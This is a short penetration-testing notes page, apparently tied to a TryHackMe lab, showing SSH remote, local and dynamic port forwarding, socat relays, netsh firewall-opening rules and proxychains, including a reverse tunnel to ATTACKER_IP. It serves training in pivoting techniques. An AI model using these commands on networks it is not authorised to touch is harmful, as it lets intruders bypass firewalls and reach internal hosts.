# Port forwarding

## SSH Tunnelling

<pre class="language-bash"><code class="lang-bash"><strong># Creating tunneluser
</strong><strong>useradd tunneluser -m -d /home/tunneluser -s /bin/true
</strong>passwd tunneluser
</code></pre>

## SSH Remote Port Forwarding

<figure><img src="../../.gitbook/assets/Capture d&#x27;écran 2024-05-06 023853.png" alt=""><figcaption></figcaption></figure>

PC 1

```
ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
```

## SSH Local Port Forwarding



<figure><img src="../../.gitbook/assets/Capture d&#x27;écran 2024-05-06 024225.png" alt=""><figcaption></figcaption></figure>

PC1

```
# Change fw settinng for listening on new port
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80

ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
```

## Port Forwarding With socat

### Remote

<figure><img src="../../.gitbook/assets/Capture d&#x27;écran 2024-05-06 024802.png" alt=""><figcaption></figcaption></figure>

```
# Remote 
socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389

```

### local

<figure><img src="../../.gitbook/assets/Capture d&#x27;écran 2024-05-06 025035.png" alt=""><figcaption></figcaption></figure>

```
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80

```

## Dynamic Port Forwarding and SOCKS

PC1&#x20;

```
ssh tunneluser@1.1.1.1 -R 9050 -N
```

Attacker

```
# Edit /etc/proxychains.conf
socks4  127.0.0.1 9050

# access to target service 
proxychains <command> <arg>
```

## Use both local and remote port forwarding

```
ssh tunneluser@ATTACKER_IP -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
```
